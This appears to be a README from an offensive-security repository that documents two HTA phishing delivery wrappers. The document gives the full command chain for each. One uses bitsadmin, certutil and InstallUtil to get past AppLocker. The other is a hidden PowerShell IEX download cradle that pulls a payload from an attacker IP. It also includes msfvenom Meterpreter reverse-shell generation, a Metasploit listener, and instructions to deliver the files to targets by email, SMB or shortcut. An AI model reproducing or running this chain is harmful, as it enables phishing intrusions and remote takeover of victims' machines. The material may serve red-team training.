# HTA Delivery

## Files

| File | Purpose |
|---|---|
| `black.hta` | bitsadmin download → certutil decode → InstallUtil AppLocker bypass |
| `red.hta` | PowerShell download cradle → in-memory execution, no disk artifacts |

> Both files are **delivery wrappers only** — they don't ship a payload. You supply the
> payload, and the two files expect **different kinds** of payload. See below.

## What "the payload" refers to in each file

| File | Placeholder | What it must be |
|---|---|---|
| `black.hta` | `shell.exe` | A **.NET InstallUtil payload** — a compiled C# assembly with a `[RunInstaller(true)]` installer class. **Not** a raw Go/Meterpreter implant: `InstallUtil.exe /U` only loads and executes *.NET* installer assemblies. |
| `red.hta` | `payload.ps1` | Any **PowerShell** script to run in memory — e.g. `ps-loaders/ps-shellcode-runner.ps1` with a Meterpreter shellcode byte array (via `msfvenom -f ps1`), or a simple download cradle. |

### Why `black.hta` needs a .NET payload (not a Go implant)

`InstallUtil.exe /U` is the .NET Assembly Installer tool. With `/U` it loads an assembly
and invokes its installer class's `Uninstall()` method. A raw Go/Meterpreter implant
(`msfvenom -p windows/x64/meterpreter_reverse_tcp ... -f exe`) is **not** a .NET assembly, so InstallUtil cannot
run it.

The repo already ships a ready-made .NET payload for this exact chain:
`word-macro/installutil-applocker-bypass/installutil.cs`. Compiled, it implements
`Uninstall()` to download + execute two files over HTTP (`amsi.txt` and `run.txt`) in a
fresh runspace. See `word-macro/installutil-applocker-bypass/README.md`.

---

## When to Use Which

| | `black.hta` | `red.hta` |
|---|---|---|
| AppLocker blocking PowerShell | ✓ | ✗ |
| No AppLocker | ✓ | ✓ |
| Disk artifacts | `shell.exe` in `C:\Windows\Tasks\` | None |
| Complexity | 3-step chain | Single PS cradle |

---

## black.hta

> **`shell.exe` = your .NET InstallUtil payload** — compile `installutil.cs` from
> `word-macro/installutil-applocker-bypass/`, **not** a Go/Meterpreter implant. At runtime
> `shell.exe` downloads `amsi.txt` + `run.txt` from your HTTP server and runs them in a
> fresh runspace.

**1. Compile the .NET payload as `shell.exe`:**
```powershell
# 1) Update the IP inside installutil.cs (full csc reference path in
#    word-macro/installutil-applocker-bypass/README.md)
# 2) Compile:
csc /target:exe /platform:x64 /optimize+ /out:shell.exe installutil.cs `
    /r:System.Management.Automation.dll /r:System.Configuration.Install.dll
```

**2. Base64-encode it:**
```powershell
certutil -encode shell.exe clm.txt
```

**3. Host `clm.txt`, `amsi.txt`, and `run.txt` (your PowerShell payload) on your HTTP server:**
```bash
python3 -m http.server 80
```

**4. Update the attacker IP in `black.hta`:**
```js
shell.Run("bitsadmin /transfer myjob /download /priority FOREGROUND http://<YOUR_IP>/clm.txt ...", 0, true);
```

**5. Start your listener** (for whatever `run.txt` stages into):
```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
```

**6. Deliver to target** — email attachment, SMB share, phishing page, or `.lnk` shortcut pointing to `mshta.exe black.hta`.

---

## red.hta

> **`payload.ps1` = your in-memory PowerShell payload** (e.g. a Meterpreter PS1 shellcode runner
> or a download cradle). No disk write.

**1. Prepare `payload.ps1`** — e.g. generate Meterpreter shellcode, convert to a
PowerShell array, then feed it into `ps-loaders/ps-shellcode-runner.ps1`:
```text
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f raw -o /tmp/sc.bin
msfvenom -p generic/custom PAYLOADFILE=/tmp/sc.bin -f ps1 -o /tmp/payload.ps1
```

**2. Host `payload.ps1` on your HTTP server:**
```bash
python3 -m http.server 80
```

**3. Update the attacker IP in `red.hta`:**
```js
shell.Run("powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://<YOUR_IP>/payload.ps1')\"", 0, false);
```

**4. Start your listener:**
```bash
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT 443; set ExitOnSession false; exploit -j"
```

**5. Deliver to target** — same delivery methods as above.
